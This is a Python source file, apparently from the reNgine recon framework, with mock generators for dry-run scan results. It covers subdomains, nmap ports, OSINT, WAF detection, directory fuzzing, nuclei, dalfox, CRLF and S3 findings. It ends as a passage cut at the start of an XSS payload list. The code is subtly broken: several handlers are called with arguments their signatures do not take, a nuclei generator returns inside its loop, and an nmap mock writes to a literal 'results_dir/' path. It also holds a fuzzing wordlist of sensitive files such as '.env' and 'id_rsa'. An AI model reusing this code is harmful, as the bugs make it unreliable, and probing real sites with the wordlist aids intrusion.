"""
Mock data utilities for dry run testing
"""

from datetime import datetime
import random
import os
from pathlib import Path
from urllib.parse import urlparse
import json

from reNgine.utils.logger import default_logger as logger
from reNgine.definitions import UNCOMMON_WEB_PORTS
from reNgine.utils.formatters import SafePath
from reNgine.utils.debug import debug
class MockData:
    def __init__(self, context=None):
        """Initialize MockData with optional context."""
        self.context = context or {}
        
        # Always ensure we have a default domain_name in context
        if 'domain_name' not in self.context:
            self.context['domain_name'] = 'example.com'

    def get_mock_for_task(self, task_name, args=None, kwargs=None, results_dir=None, ctx=None):
        """Get mock data for a specific task according to workflow requirements.
        
        Args:
            task_name (str): Name of the task
            args (tuple): Positional arguments of the task
            kwargs (dict): Keyword arguments of the task
            results_dir (str): Directory to store mock files
            ctx (dict): Task context
            
        Returns:
            dict/list: Mock data for the task
        """
        #debug()
        if args is None:
            args = ()
        if kwargs is None:
            kwargs = {}
        if ctx is None:
            ctx = {}

        if not results_dir and ctx:
            results_dir = ctx.get('results_dir', '/tmp')

        # Create a mapping of task handlers
        task_mock_handlers = {
            # Initial scan handlers
            'scan_http_ports': self.mock_scan_http_ports,
            'port_scan': self.mock_port_scan,
            'run_nmap': self.mock_run_nmap,
            
            # Discovery handlers
            'subdomain_discovery': self.mock_subdomain_discovery,
            'osint': self.mock_osint,
            'fetch_url': self.mock_fetch_url,
            
            # Vulnerability scan handlers
            'vulnerability_scan': self.mock_vulnerability_scan,
            'nuclei_scan': self.mock_nuclei_scan,
            'dalfox_scan': self.mock_dalfox_scan,
            's3scanner': self.mock_s3scanner,
            'crlfuzz_scan': self.mock_crlfuzz_scan,
            
            # Infrastructure analysis handlers
            'dir_file_fuzz': self.mock_dir_file_fuzz,
            'screenshot': self.mock_screenshot,
            'waf_detection': self.mock_waf_detection,
            'http_crawl': self.mock_http_crawl,
            
            # Command execution handlers
            'nmap': self.mock_nmap,
        }
        
        # Log the mock task being executed
        logger.info(f"🧪 Generating mock data for task: {task_name}")
        
        # Call the appropriate handler or fallback to generic mock
        if task_name in task_mock_handlers:
            return task_mock_handlers[task_name](args, kwargs, results_dir, ctx)
        
        logger.warning(f"No specific mock handler for task {task_name}, using generic mock")
        return self._create_generic_mock(task_name, args, kwargs, ctx)

    def get_target_urls(self, ctx=None, kwargs=None):
        """Extract URLs to use for mock data generation from context or command args"""
        # Use the provided context as parameter if available
        ctx = ctx or self.context or {}
        kwargs = kwargs or {}
        
        # Check if mock URLs are explicitly provided in context
        if 'mock' in ctx and isinstance(ctx['mock'], dict):
            for cmd_type in ['http_crawl', 'nuclei', 'dalfox', 's3scanner', 'crlfuzz']:
                if cmd_type in ctx['mock'] and 'urls' in ctx['mock'][cmd_type]:
                    return ctx['mock'][cmd_type]['urls']

        # Check if URLs are in context from prepare_urls functions
        if 'urls' in ctx and ctx['urls']:
            return ctx['urls']
        
        # Get URLs from kwargs if provided
        if 'urls' in kwargs and kwargs['urls']:
            return kwargs['urls']

        # Generate some random URLs as fallback
        domain = ctx.get('domain_name', 'example.com')
        return self._generate_urls(count=5, base_domains=[domain], subdomains=True, paths=True)

    def mock_subdomain_discovery(self, args, kwargs, results_dir, ctx):
        """Generate mock subdomains as a simple list.
        
        Ensures a reasonable number of subdomains are generated (5-15).
        """
        host = kwargs.get('host') or ctx.get('domain_name', 'example.com')

        # Generate 5-15 mock subdomains
        count = random.randint(5, 15)
        subdomains = self._generate_subdomain_data(host, count)

        # Write results to a file
        output_file = f"{results_dir}/subdomains.txt"
        with open(output_file, 'w') as f:
            f.write('\n'.join(subdomains))

        # Create serialized response similar to SubdomainSerializer output
        subdomain_data = []
        subdomain_data.extend(
            {
                'name': subdomain,
                'is_alive': random.random() > 0.2,  # 80% chance of being alive
                'http_status': (
                    random.choice([200, 301, 302, 403, 404, 500])
                    if random.random() > 0.2
                    else None
                ),
                'content_length': (
                    random.randint(5000, 50000) if random.random() > 0.2 else None
                ),
                'page_title': (
                    f"Mock page for {subdomain}" if random.random() > 0.3 else None
                ),
            }
            for subdomain in subdomains
        )
        logger.info(f"🧪 Generated {len(subdomains)} mock subdomains for {host}")
        return subdomain_data

    def mock_fetch_url(self, args, kwargs, results_dir, ctx):
        """Create mock result for fetch_url task.
        
        Returns:
            dict: Mock URL fetch results
        """
        # Get URLs from arguments or generate them
        urls = kwargs.get('urls', None)
        base_domains = [ctx['domain_name']] if ctx and 'domain_name' in ctx else None
        # Generate URLs if none provided
        if not urls:
            count = 20 if urls is None else len(urls)

            urls = self._generate_urls(count=count, base_domains=base_domains, 
                                    subdomains=True, paths=True, params=True)

        # Generate mock results for each URL
        results = self._generate_httpx_output(urls, ctx)

        logger.info(f"🧪 Generated mock data for {len(results)} URLs")
        return results

    def mock_http_crawl(self, args, kwargs, results_dir, ctx):
        """Create mock result for http_crawl task.
        
        Returns:
            dict: Mock URL fetch results
        """
        urls = kwargs.get('urls', [])

        # If no URLs provided, generate from domain/subdomains
        if not urls:
            if ctx.get('subdomain_id'):
                # For subdomain-specific crawl
                domain = ctx.get('domain_name', 'example.com')
                urls = [f"https://{domain}"]
            else:
                # Generate from domain and a few subdomains
                domain = ctx.get('domain_name', 'example.com')
                subdomains = self._generate_mock_subdomains(domain, 3)
                urls = [f"https://{sub}" for sub in subdomains]        

        logger.info(f"🧪 Generated HTTP crawl data for {len(urls)} URLs")
        return self._generate_httpx_output(urls)

    def mock_osint(self, args, kwargs, results_dir, ctx):
        """Mock OSINT results using domain and existing subdomains."""
        host = kwargs.get('host') or ctx.get('domain_name', 'example.com')
        
        # Create mock OSINT data structure
        osint_data = self._generate_osint_output(host)
        
        # Write mock OSINT data to file
        osint_file = f"{results_dir}/osint_results.json"
        with open(osint_file, 'w') as f:
            json.dump(osint_data, f, indent=2)
        
        logger.info(f"🧪 Generated mock OSINT data for {host}")
        return osint_data


    def mock_screenshot(self, args, kwargs, results_dir, ctx):
        """Create mock result for screenshot task.
        
        Args:
            args (tuple): Positional arguments
            kwargs (dict): Keyword arguments
            results_dir (str): Directory to store results
            ctx (dict): Task context
            
        Returns:
            dict: Mock screenshot results
        """
        # Get URLs from various sources
        urls = self._get_screenshot_urls(kwargs, ctx)
        
        # Generate mock results
        results = {}
        for url in urls:
            results[url] = self._generate_screenshot_result(url, results_dir)
        
        logger.info(f"🧪 Generated mock screenshot data for {len(results)} URLs")
        return results

    def mock_waf_detection(self, args, kwargs, results_dir, ctx):
        """Create mock result for waf_detection task.
        
        Returns:
            dict: Mock WAF detection results
        """
        # Get URLs from arguments or context
        urls = kwargs.get('urls', None)

        # Try to get URLs from context if not in arguments
        if not urls and ctx:
            urls = ctx.get('endpoints', [])

        # Generate mock URLs if none provided
        if not urls:
            base_domains = [ctx['domain_name']] if ctx and 'domain_name' in ctx else None
            urls = self._generate_urls(count=5, base_domains=base_domains)
        elif isinstance(urls, dict):
            # If urls is a dictionary of endpoints, extract the URLs
            urls = list(urls.keys())

        # WAF provider options
        waf_providers = [
            'Cloudflare', 'Akamai', 'AWS WAF', 'Sucuri', 'Imperva', 
            'F5 ASM', 'Fortinet', 'ModSecurity', 'Barracuda', None
        ]

        # Generate mock results for each URL
        results = {}
        for url in urls:
            parsed_url = urlparse(url)
            hostname = parsed_url.netloc

            # Decide if this host has a WAF
            waf_provider = random.choice(waf_providers)

            results[url] = {
                'url': url,
                'hostname': hostname,
                'has_waf': waf_provider is not None,
                'waf_provider': waf_provider or 'None detected',
                'confidence': random.randint(70, 99) if waf_provider else 0,
                'detection_methods': ['pattern', 'behavior', 'response'] if waf_provider else [],
            }

        logger.info(f"🧪 Generated mock WAF detection data for {len(results)} URLs")
        return results


    def mock_dir_file_fuzz(self, args, kwargs, results_dir, ctx):
        """Create mock result for dir_file_fuzz task.
        
        Returns:
            dict: Mock directory and file fuzzing results
        """
        logger.info("🧪 Generating mock directory and file fuzzing data")

        # Get URLs to scan from kwargs or context
        urls = kwargs.get('urls', [])
        if not urls and ctx:
            domain = ctx.get('domain_name', 'example.com')
            # Generate some mock URLs for the domain
            base_url = f"https://{domain}"
            urls = [base_url]

        # Generate the fuzzing results
        fuzzing_results = self._generate_dir_file_fuzz_output(urls)

        # Create output files
        try:
            self._create_fuzzing_files(results_dir, fuzzing_results, urls)
        except Exception as e:
            logger.error(f"Error creating mock fuzzing files: {str(e)}")

        logger.info(f"🧪 Generated mock fuzzing data for {len(urls)} URLs")
        return fuzzing_results

    def mock_vulnerability_scan(self, args, kwargs, results_dir, ctx):
        """Create mock result for vulnerability_scan task.
        
        Returns:
            dict: Mock vulnerability scan results with realistic vulnerabilities
        """
        logger.info("🧪 Generating mock vulnerability scan data")

        # Get URLs to scan from kwargs or context
        urls = kwargs.get('urls', [])
        if not urls and ctx:
            domain = ctx.get('domain_name', 'example.com')
            # Generate some mock URLs for the domain
            urls = self._generate_urls(5, [domain])

        # Generate scan results
        scan_results = {
            'scan_id': f"mock-vuln-scan-{random.randint(1000, 9999)}",
            'timestamp': f"2023-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}T{random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00Z",
            'target_count': len(urls),
            'vulnerabilities': [],
            'statistics': {
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
                'info': 0,
                'total': 0
            },
            'tools': {
                'nuclei': {
                    'findings': []
                },
                'dalfox': {
                    'findings': []
                },
                'crlfuzz': {
                    'findings': []
                },
                's3scanner': {
                    'findings': []
                }
            }
        }

        # Generate vulnerabilities using existing generators
        nuclei_vulns = self.generate_mock_nuclei_vulnerabilities(urls, count=3)
        dalfox_vulns = self.generate_mock_dalfox_vulnerabilities(urls, count=2)
        crlfuzz_vulns = self.generate_mock_crlfuzz_vulnerabilities(urls, count=1)
        s3scanner_vulns = self.generate_mock_s3scanner_vulnerabilities(count=2)

        # Add nuclei vulnerabilities
        for vuln in nuclei_vulns:
            scan_results['tools']['nuclei']['findings'].append(vuln)

            # Add to main vulnerabilities list
            unified_vuln = {
                'id': f"VULN-{random.randint(1000, 9999)}",
                'url': vuln.get('host', ''),
                'name': vuln.get('info', {}).get('name', 'Unknown Vulnerability'),
                'severity': vuln.get('info', {}).get('severity', 'medium'),
                'description': vuln.get('info', {}).get('description', ''),
                'identified_by': 'nuclei',
                'references': vuln.get('info', {}).get('reference', []),
                'evidence': vuln.get('matched-at', '')
            }
            scan_results['vulnerabilities'].append(unified_vuln)

            # Update statistics
            severity = unified_vuln['severity']
            if severity in scan_results['statistics']:
                scan_results['statistics'][severity] += 1
            scan_results['statistics']['total'] += 1

        # Add dalfox vulnerabilities
        for vuln in dalfox_vulns:
            scan_results['tools']['dalfox']['findings'].append(vuln)

            # Add to main vulnerabilities list
            unified_vuln = {
                'id': f"VULN-{random.randint(1000, 9999)}",
                'url': vuln.get('url', ''),
                'name': f"XSS - {vuln.get('message', 'Cross-Site Scripting')}",
                'severity': vuln.get('severity', 'high'),
                'description': f"XSS vulnerability in {vuln.get('param', '')} parameter",
                'identified_by': 'dalfox',
                'references': ['https://owasp.org/www-community/attacks/xss/'],
                'evidence': vuln.get('evidence', '')
            }
            scan_results['vulnerabilities'].append(unified_vuln)

            # Update statistics
            severity = unified_vuln['severity']
            if severity in scan_results['statistics']:
                scan_results['statistics'][severity] += 1
            scan_results['statistics']['total'] += 1

        # Add crlfuzz vulnerabilities
        for vuln in crlfuzz_vulns:
            scan_results['tools']['crlfuzz']['findings'].append(vuln)

            # Add to main vulnerabilities list
            unified_vuln = {
                'id': f"VULN-{random.randint(1000, 9999)}",
                'url': vuln.get('url', ''),
                'name': 'CRLF Injection',
                'severity': vuln.get('severity', 'medium'),
                'description': vuln.get('description', ''),
                'identified_by': 'crlfuzz',
                'references': ['https://owasp.org/www-community/vulnerabilities/CRLF_Injection'],
                'evidence': vuln.get('evidence', '')
            }
            scan_results['vulnerabilities'].append(unified_vuln)

            # Update statistics
            severity = unified_vuln['severity']
            if severity in scan_results['statistics']:
                scan_results['statistics'][severity] += 1
            scan_results['statistics']['total'] += 1

        # Add s3scanner vulnerabilities
        for bucket in s3scanner_vulns:
            scan_results['tools']['s3scanner']['findings'].append(bucket)

            # Only add to main vulnerabilities if misconfigured
            bucket_info = bucket.get('bucket', {})
            if (
                bucket_info.get('perm_all_users_read', False)
                or bucket_info.get('perm_all_users_write', False)
                or bucket_info.get('perm_all_users_full_control', False)
            ):
                unified_vuln = {
                    'id': f"VULN-{random.randint(1000, 9999)}",
                    'url': bucket_info.get('url', ''),
                    'name': 'S3 Bucket Misconfiguration',
                    'severity': 'high',
                    'description': f"Public access permissions found on S3 bucket '{bucket_info.get('name')}'",
                    'identified_by': 's3scanner',
                    'references': ['https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html'],
                    'evidence': f"Bucket: {bucket_info.get('name')}, Permission: Public Read Access"
                }
                scan_results['vulnerabilities'].append(unified_vuln)

                # Update statistics
                scan_results['statistics']['high'] += 1
                scan_results['statistics']['total'] += 1

        # Create output files
        try:
            self._create_vulnerability_files(results_dir, scan_results)
        except Exception as e:
            logger.error(f"Error creating mock vulnerability scan files: {str(e)}")

        # Return the results
        return scan_results


    def mock_port_scan(self, args, kwargs, results_dir, ctx):
        """Create mock result for port_scan task.
        
        Returns:
            dict: Mock port scan results
        """
        
        # Get target hosts from context
        hosts = []
        if ctx and 'subdomains' in ctx:
            hosts = [s.get('name') for s in ctx['subdomains']]
        elif not hosts:
            hosts = ['example.com', 'sub1.example.com', 'sub2.example.com']
        
        # Build ports data for run_nmap
        ports_data = {}
        for host in hosts:
            # Assign different port configurations to different hosts
            if random.random() < 0.3:
                # Web server with database
                ports_data[host] = [22, 80, 443, 3306]
            elif random.random() < 0.6:
                # Application server
                ports_data[host] = [22, 80, 443, 8080, 8443]
            else:
                # Basic web server
                ports_data[host] = [22, 80, 443]
        
        # Configure nmap arguments for mock run
        args = {
            'nmap_cmd': '-Pn -sV --open',
            'ports_data': ports_data,
            'wait_for_results': True,
            'use_cache': False
        }
        
        # Call mock_run_nmap to generate consistent mock data
        return self.mock_run_nmap(args, {'ports_data': ports_data, 'wait_for_results': True}, 
                            results_dir, ctx)


    def mock_scan_http_ports(self, args, kwargs, results_dir, ctx):
        """Mock HTTP ports scan with limited number of results.
        
        This is a critical task as it establishes the default endpoint
        for subsequent scans.
        """
        hosts = kwargs.get('hosts', [])
        if not hosts:
            # If no hosts specified, use domain from context
            domain = ctx.get('domain_name', 'example.com')
            hosts = [domain]
        
        # Generate limited port results (max 10 ports)
        port_results = {}
        for host in hosts:
            # Ensure we always have port 80 or 443 for default endpoint
            default_ports = [80, 443]
            
            # Add a few random ports from uncommon web ports (max 3)
            random_ports = random.sample(
                [p for p in UNCOMMON_WEB_PORTS if p not in default_ports], 
                min(3, len(UNCOMMON_WEB_PORTS))
            )
            
            # Combine ports, prioritizing standard web ports
            ports = default_ports + random_ports
            
            # Create mock port data
            port_results[host] = {
                'ports': ports,
                'default_url': f"https://{host}",
                'is_default': True,
                'http_status': 200,
                'xml_file': f"{results_dir}/{host}_nmap.xml"
            }
            
            # Create basic XML file for nmap results
            self._generate_nmap_xml(port_results[host]['xml_file'], host, ports)
        
        logger.info(f"🧪 Generated HTTP ports data for {len(hosts)} hosts")
        return port_results

    def mock_run_nmap(self, args, kwargs, results_dir, ctx):
        """Create mock result for run_nmap task.
        
        Returns:
            dict: Mock nmap results per host
        """
        ports_data = kwargs.get('ports_data', {})
        wait_for_results = kwargs.get('wait_for_results', False)
        
        if not wait_for_results:
            return None
        
        results = {}
        for host, ports in ports_data.items():
            host_result = {
                'host': host,
                'ip': f'192.168.1.{random.randint(1, 254)}',
                'ports': []
            }
            
            # Add mock port data
            for port in ports:
                is_http = port in [80, 443] or (port in UNCOMMON_WEB_PORTS)
                service = 'http' if is_http and port != 443 else 'https' if port == 443 else f'service_{port}'
                
                host_result['ports'].append({
                    'port': port,
                    'service': service,
                    'state': 'open',
                    'protocol': 'tcp',
                    'reason': 'syn-ack',
                    'product': f'Product {port}',
                    'version': f'{random.randint(1, 5)}.{random.randint(0, 10)}',
                })
                
            results[host] = host_result
            
        return results

    def mock_nmap(self, args, kwargs, results_dir, ctx):
        """Create mock result for individual nmap command task.
        
        Returns:
            dict: Mock nmap command result
        """
        host = kwargs.get('host', 'example.com')
        ports = kwargs.get('ports', [80, 443])
        xml_file = f"results_dir/{host}_nmap.xml"
        if kwargs.get('xml_output', True):
            # Create mock XML file
            try:
                self._generate_nmap_xml(xml_file, host, ports)
            except (ValueError, OSError) as e:
                logger.error(f"Failed to create mock XML for {host}: {str(e)}")

        # Return command result
        return {
            'command': f"nmap {host} -p {','.join(map(str, ports))}",
            'return_code': 0,
            'output': f"Mock nmap scan for {host}",
        }


    def mock_nmap_xml_output(self, hosts, count=5):
        """Generate mock nmap output for dry run testing
        
        Args:
            hosts (list): List of hosts to associate with mock data
            count (int): Number of mock outputs to generate per host
        """ 
        return self._generate_nmap_xml(hosts, count)

    def mock_nuclei_scan(self, urls, count=5):
        """Generate mock vulnerability data for dry run testing
        
        Args:
            urls (list): List of URLs to associate vulnerabilities with
            count (int): Number of vulnerabilities to generate per URL
            
        Returns:
            list: List of mock vulnerability dictionaries
        """
        return self._generate_nuclei_output(urls, count)
        
    def mock_dalfox_scan(self, urls, count=3):
        """Generate mock Dalfox XSS vulnerability data for dry run testing
        
        Args:
            urls (list): List of URLs to associate vulnerabilities with
            count (int): Number of vulnerabilities to generate per URL
            
        Returns:
            list: List of mock Dalfox vulnerability dictionaries
        """
        return self._generate_dalfox_output(urls, count)

    def mock_crlfuzz_scan(self, urls, count=3):
        """Generate mock CRLFUZZ vulnerability data for dry run testing
        
        Args:
            urls (list): List of URLs to associate vulnerabilities with
            count (int): Number of vulnerabilities to generate per URL
            
        Returns:
            list: List of mock CRLFUZZ vulnerability dictionaries
        """
        return self._generate_crlfuzz_output(urls, count)

    def mock_s3scanner(self, count=5):
        """Generate mock S3Scanner bucket data for dry run testing
        
        Args:
            count (int): Number of buckets to generate
            
        Returns:
            list: List of mock S3Scanner bucket dictionaries
        """
        return self._generate_s3scanner_vulnerabilities(count)

    def _create_generic_mock(self, task_name, args, kwargs, ctx):
        """Create a generic mock result for tasks without specific handlers.
        
        Returns:
            dict: Generic mock data
        """
        logger.info(f"Creating generic mock data for task: {task_name}")
        return {
            "task": task_name,
            "status": "success",
            "message": f"Mock data for {task_name}",
            "timestamp": "2023-12-25T12:00:00Z",
            "data": {
                "mock": True,
                "args": args,
                "kwargs": kwargs,
            }
        }

    def _create_fuzzing_files(self, results_dir, fuzzing_results, urls):
        """Create mock fuzzing output files in various formats.
        
        Args:
            results_dir (str): Directory to store results
            fuzzing_results (dict): Dictionary with fuzzing results data
            urls (list): List of URLs that were fuzzed
        """
        # Create fuzzing directory if it doesn't exist
        output_dir = os.path.join(results_dir, 'dir_file_fuzz')
        os.makedirs(output_dir, exist_ok=True)
        
        # Create a JSON results file
        self._write_json_results(output_dir, fuzzing_results)
        
        # Create tool-specific output files
        tools = ['dirsearch', 'gobuster', 'ffuf']
        for tool in tools:
            self._write_tool_results(output_dir, tool, urls, fuzzing_results)
        
        logger.info(f"🧪 Mock directory and file fuzzing results saved to {output_dir}")

    def _create_screenshot_filename(self, hostname):
        """Create a safe filename for the screenshot.
        
        Args:
            hostname (str): Hostname from URL
            
        Returns:
            str: Safe filename
        """
        safe_hostname = hostname.replace('.', '_')
        return f"{safe_hostname}_{random.randint(1000, 9999)}.png"

    def _create_screenshot_file(self, filename, results_dir):
        """Create a mock screenshot file and return its path.
        
        Args:
            filename (str): Screenshot filename
            results_dir (str): Directory to store results
            
        Returns:
            str: Path to mock screenshot file
        """
        if results_dir:
            screenshot_path = os.path.join(results_dir, 'screenshots', filename)
            # Ensure directory exists
            os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)
            
            # Create an empty file to simulate the screenshot
            Path(screenshot_path).touch()
            return screenshot_path
        else:
            return f"/static/screenshots/{filename}"

    def _create_nmap_xml(self, host, results_dir, ports):
        xml_filename = f"{host}_nmap.xml"
        xml_path = SafePath.create_safe_path(
            base_dir=results_dir or '/tmp',
            components=[xml_filename],
            create_dir=False
        )

        # Create host result for XML generation
        host_result = {
            'host': host,
            'ip': f'192.168.1.{random.randint(1, 254)}',
            'ports': []
        }

        # Add ports
        for port in ports:
            is_http = port in [80, 443] or (port in UNCOMMON_WEB_PORTS)
            service = 'http' if is_http and port != 443 else 'https' if port == 443 else f'service_{port}'

            host_result['ports'].append({
                'port': port,
                'service': service,
                'state': 'open',
                'protocol': 'tcp',
                'reason': 'syn-ack',
                'product': f'Product {port}',
                'version': f'{random.randint(1, 5)}.{random.randint(0, 10)}',
            })

        # Generate XML content
        xml_content = self._generate_nmap_xml(xml_path, host, ports)

        # Write XML file
        with open(xml_path, 'w') as f:
            f.write(xml_content)

    def _create_vulnerability_files(self, results_dir, scan_results):
        """Create mock vulnerability scan results files.
        
        Args:
            results_dir (str): Directory to save the mock results
            scan_results (dict): Dictionary containing vulnerability scan results
        """
        # Create output directory if it doesn't exist
        output_dir = os.path.join(results_dir, 'vulnerability_scan')
        os.makedirs(output_dir, exist_ok=True)

        # Create a mock results JSON file
        results_file = os.path.join(output_dir, 'vulnerability_results.json')
        with open(results_file, 'w') as f:
            json.dump(scan_results, f, indent=2)

        # Create individual tool result files
        for tool in ['nuclei', 'dalfox', 'crlfuzz', 's3scanner']:
            tool_file = os.path.join(output_dir, f"{tool}_results.json")
            with open(tool_file, 'w') as f:
                json.dump(scan_results['tools'][tool]['findings'], f, indent=2)

        logger.info(f"🧪 Mock vulnerability scan results saved to {output_dir}")

    def _generate_nmap_xml(self, output_file, host, ports):
        """
        Create a simplified mock Nmap XML output file.

        Args:
            output_file (str): Path to save the generated XML file
            host (str): Hostname to include in the XML
            ports (list): List of ports to include in the XML
        """
        xml_content = f"""<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE nmaprun>
    <nmaprun scanner="nmap" args="nmap -sV -p {','.join(map(str, ports))} {host}" start="1">
    <host starttime="1">
        <address addr="{host}" addrtype="ipv4"/>
        <hostnames>
        <hostname name="{host}" type="user"/>
        </hostnames>
        <ports>"""
        
        for port in ports:
            service = "http"
            if port == 443:
                service = "https"
            elif port not in [80, 443]:
                service = random.choice(["http", "https"])
            
            xml_content += f"""
        <port protocol="tcp" portid="{port}">
            <state state="open" reason="syn-ack" reason_ttl="64"/>
            <service name="{service}" product="Apache" version="2.4.29" method="probed" conf="10"/>
        </port>"""
        
        xml_content += """
        </ports>
    </host>
    </nmaprun>"""

        # Create parent directory if it doesn't exist
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        
        # Write to file
        with open(output_file, 'w') as f:
            f.write(xml_content)

    def _generate_httpx_output(self, urls):
        """Generate mock httpx output for the given URLs
        
        Args:
            urls (list): List of URLs to generate output for
            
        Returns:
            list: List of mock httpx results
        """

        results = []
        for url in urls:
            parsed = urlparse(url)
            hostname = parsed.netloc
            path = parsed.path or '/'
            
            # Create variations of status codes, with more probability for common codes
            status_code = random.choices(
                [200, 301, 302, 403, 404, 500, 503], 
                weights=[0.6, 0.1, 0.1, 0.05, 0.1, 0.03, 0.02]
            )[0]
            
            # Generate random page title
            title = f"Page title for {hostname}{path[:20]}"
            if status_code == 404:
                title = "404 Not Found"
            elif status_code == 403:
                title = "Access Denied"
            elif status_code == 500:
                title = "Internal Server Error"
                
            # Select random content type
            content_type = random.choice([
                'text/html', 'application/json', 'text/plain', 
                'application/javascript', 'text/css'
            ])

            # Create mock result
            result = {
                'url': url,
                'status_code': status_code,
                'title': title,
                'content_type': content_type,
                'content_length': random.randint(500, 150000),
                'technologies': self._generate_random_technologies(),
                'webserver': random.choice(['nginx', 'apache', 'cloudflare', 'iis']),
                'location': url if status_code in [301, 302] else None,
                'body_hash': f"{random.randint(100000, 999999)}",
                'timestamp': datetime.now().isoformat()
            }
            
            results.append(result)

        return results

    def _generate_osint_output(self, host):
        """
        Generate mock osint output

        Args:
            host (str): Domain to generate mock osint output for
        """

        return {
        'status': 'submitted',
        'discovery': {
            'whois': {
                'domain_name': host,
                'registrar': 'Mock Registrar Inc.',
                'creation_date': '2010-01-01',
                'expiration_date': '2030-01-01',
                'name_servers': [f'ns1.{host}', f'ns2.{host}']
            },
            'emails': [f'admin@{host}', f'info@{host}', f'support@{host}'],
            'related_domains': [f'blog.{host}', f'dev.{host}', f'stage.{host}']
        },
        'dorking': {
            'google': [
                {'title': f'Login - {host}', 'url': f'https://{host}/login'},
                {'title': f'About - {host}', 'url': f'https://{host}/about'},
                {'title': f'Contact - {host}', 'url': f'https://{host}/contact'}
            ]
            }
        }

    def _generate_dir_file_fuzz_output(self, urls):
        """Generate mock directory and file fuzzing results for given URLs.
        
        Args:
            urls (list): List of URLs to generate fuzzing results for
            
        Returns:
            dict: Mock directory and file fuzzing results
        """
        # Common endpoints to "discover" during fuzzing
        common_paths = [
            # Admin panels
            '/admin', '/admin.php', '/administrator', '/login', '/wp-admin',
            # API endpoints
            '/api', '/api/v1', '/api/v2', '/swagger', '/graphql',
            # Common directories
            '/images', '/css', '/js', '/uploads', '/assets', '/static',
            # Common files
            '/robots.txt', '/sitemap.xml', '/favicon.ico', '/README.md', '/CHANGELOG.txt',
            # Sensitive files
            '/.git/HEAD', '/.env', '/config.php', '/wp-config.php', '/id_rsa',
            # Backup files
            '/index.php~', '/backup.sql', '/database.sql.gz',
            # Various extensions
            '/index.php', '/index.html', '/info.php', '/phpinfo.php', '/test.php'
        ]

        # Status codes with probability weights (200 most common)
        status_probabilities = [
            (200, 0.6),    # 60% success
            (403, 0.15),   # 15% forbidden
            (404, 0.1),    # 10% not found
            (401, 0.05),   # 5% unauthorized
            (500, 0.05),   # 5% server error
            (301, 0.025),  # 2.5% permanent redirect
            (302, 0.025)   # 2.5% temporary redirect
        ]

        fuzzing_results = {
            'scan_id': f"mock-dir-fuzz-{random.randint(1000, 9999)}",
            'timestamp': f"2023-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}T{random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00Z",
            'target_count': len(urls),
            'total_endpoints': 0,
            'endpoints_by_status': {
                '200': [],
                '301': [],
                '302': [],
                '401': [],
                '403': [],
                '404': [],
                '500': []
            },
            'findings_by_url': {}
        }

        # Process each URL
        for base_url in urls:
            parsed_url = urlparse(base_url)
            hostname = parsed_url.netloc

            # Determine how many endpoints to "find" (5-15)
            discovery_count = random.randint(5, 15)

            # Select random paths to "discover"
            discovered_paths = random.sample(common_paths, min(discovery_count, len(common_paths)))

            url_findings = []

            # Create results for each discovered path
            for path in discovered_paths:
                # Construct full URL
                if path.startswith('/'):
                    full_url = f"{parsed_url.scheme}://{hostname}{path}"
                else:
                    full_url = f"{parsed_url.scheme}://{hostname}/{path}"

                # Randomly select status code based on probabilities
                status_code, weight = zip(*status_probabilities)
                status = random.choices(status_code, weights=weight)[0]

                # Generate response size based on status
                if status == 200:
                    size = random.randint(1000, 100000)
                elif status in [301, 302]:
                    size = random.randint(200, 500)
                elif status in [401, 403]:
                    size = random.randint(300, 1000)
                else:
                    size = random.randint(100, 500)

                # Create endpoint info
                endpoint_info = {
                    'url': full_url,
                    'status_code': status,
                    'content_length': size,
                    'content_type': f"application/{full_url.split('.')[-1]}" if full_url.endswith(('.js', '.css', '.jpg', '.png', '.gif')) else 'text/html',
                    'response_time': random.uniform(0.05, 1.2),
                    'discovered_by': random.choice(['dirsearch', 'gobuster', 'ffuf'])
                }

                # Add to results by status code
                fuzzing_results['endpoints_by_status'][str(status)].append(endpoint_info)

                # Add to URL-specific findings
                url_findings.append(endpoint_info)

            # Add URL findings to overall results
            fuzzing_results['findings_by_url'][base_url] = url_findings
            fuzzing_results['total_endpoints'] += len(url_findings)

        return fuzzing_results

    def _generate_nuclei_output(self, urls, count=5):
        """
        Generate mock nuclei vulnerabilities

        Args:
            urls (list): List of URLs to associate vulnerabilities with
            count (int): Number of vulnerabilities to generate per URL
        """

        vulnerabilities = []

        # Common templates for nuclei
        templates = [
            'cves/2021/CVE-2021-44228',
            'exposures/configs/git-config',
            'vulnerabilities/wordpress/wp-config',
            'vulnerabilities/generic/basic-xss',
            'vulnerabilities/generic/basic-ssrf',
            'vulnerabilities/generic/open-redirect',
            'misconfiguration/security-txt'
        ]

        severity_map = {
            'cves': 'critical',
            'exposures': 'medium',
            'vulnerabilities/wordpress': 'high',
            'vulnerabilities/generic/basic-xss': 'medium',
            'vulnerabilities/generic/basic-ssrf': 'high',
            'vulnerabilities/generic/open-redirect': 'medium',
            'misconfiguration': 'info'
        }

        for url in urls:
            # Only generate findings for some URLs (30% chance)
            if random.random() > 0.3:
                continue

            template = random.choice(templates)
            severity = next(
                (value for key, value in severity_map.items() if key in template),
                'info',
            )
            # Create mock vulnerability with nuclei's expected format
            vulnerability = {
                'template': template,
                'info': {
                    'name': template.split('/')[-1].replace('-', ' ').title(),
                    'author': 'nuclei-team',
                    'severity': severity,
                    'description': f"Mock vulnerability found using {template}",
                    'reference': f"https://example.com/references/{template}"
                },
                'host': url,
                'request': {
                    'url': url,
                    'method': 'GET',
                    'headers': {
                        'User-Agent': 'nuclei'
                    },
                    'type': 'http',
                    'matched-at': url,
                    'extracted-results': [],
                    'ip': random.choice(['192.168.1.1', '10.0.0.1', '172.16.0.1']),
                    'timestamp': datetime.now().isoformat(),
                    'matcher-status': True,
                    'matched-line': random.randint(10, 500)
                }
            }

            vulnerabilities.append(vulnerability)

            return vulnerabilities
        
    def _generate_dalfox_output(self, urls, count=5):
        """
        Generate mock dalfox XSS findings

        Args:
            urls (list): List of URLs to associate vulnerabilities with
            count (int): Number of vulnerabilities to generate per URL
            
        """
        
        vulnerabilities = []
        
        # XSS Payloads commonly detected by Dalfox
        xss_payloads = [
